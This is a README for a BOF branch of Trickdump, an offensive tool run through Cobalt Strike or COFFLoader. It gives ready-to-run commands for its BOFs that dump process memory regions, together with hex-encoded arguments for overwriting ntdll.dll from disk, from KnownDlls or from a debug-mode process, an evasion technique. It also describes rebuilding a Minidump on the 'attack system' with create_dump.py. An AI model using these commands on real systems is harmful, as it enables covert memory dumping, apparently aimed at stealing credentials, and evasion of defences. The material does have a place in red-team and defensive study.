# Trickdump - "bof-flavour" branch

This branch implements the same functionality as the main branch but using BOFs (Beacon Object Files).

You can execute the files using Cobalt Strike or TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader):

```
COFFLoader64.exe go lock_bof.o <OVERWRITE_TECHNIQUE>
```

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF1.png)


```
COFFLoader64.exe go shock_bof.o <OVERWRITE_TECHNIQUE>
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF2.png)

```
COFFLoader64.exe go barrel_bof.o <OVERWRITE_TECHNIQUE>
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF3.png)

You can use use an argument for overwriting ntdll.dll:

- "disk": Using a DLL already on disk. The default path is "C:\Windows\System32\ntdll.dll".

  - Translated to the value "0e0000000a0000006400690073006b000000" for COFFLoader.

- "knowndlls": Using the KnownDlls folder.

  - Translated to the value "18000000140000006b006e006f0077006e0064006c006c0073000000" for COFFLoader.

- "debugproc": Using a process created in debug mode. The default process is "c:\windows\system32\calc.exe".

  - Translated to the value "180000001400000064006500620075006700700072006f0063000000" for COFFLoader.

Examples running each one with a differente overwrite technique:

```
COFFLoader64.exe go lock_bof.o 0e0000000a0000006400690073006b000000
```

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF7.png)

```
COFFLoader64.exe go shock_bof.o 18000000140000006b006e006f0077006e0064006c006c0073000000
```

![img8](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF8.png)

```
COFFLoader64.exe go barrel_bof.o 180000001400000064006500620075006700700072006f0063000000
```

![img9](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF9.png)


I could not create a ZIP file using BOF files so the memory region dumps are created in a directory with a random name.

Use the updated *create_dump.py* script to generate the Minidump file in your attack system using the *-d* parameter for the directory path:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-d BARREL_DIRECTORY] [-o OUTPUT_FILE]
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF4.png)


-------------------------

## All in one

If you prefer to execute only one file, the Trick BOF generates the 3 JSON files and the directory with the memory regions:

```
COFFLoader64.exe go trick_bof.o <OVERWRITE_TECHNIQUE>
```

It creates all the files at the same time:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF5.png)

Optionally you can use the first argument to overwrite ntdll.dll in this case too:

```
COFFLoader64.exe go trick_bof.o 0e0000000a0000006400690073006b000000
```

![img10](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF10.png)

Then you can create the Minidump file using *create_dump.py*:

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_BOF6.png)
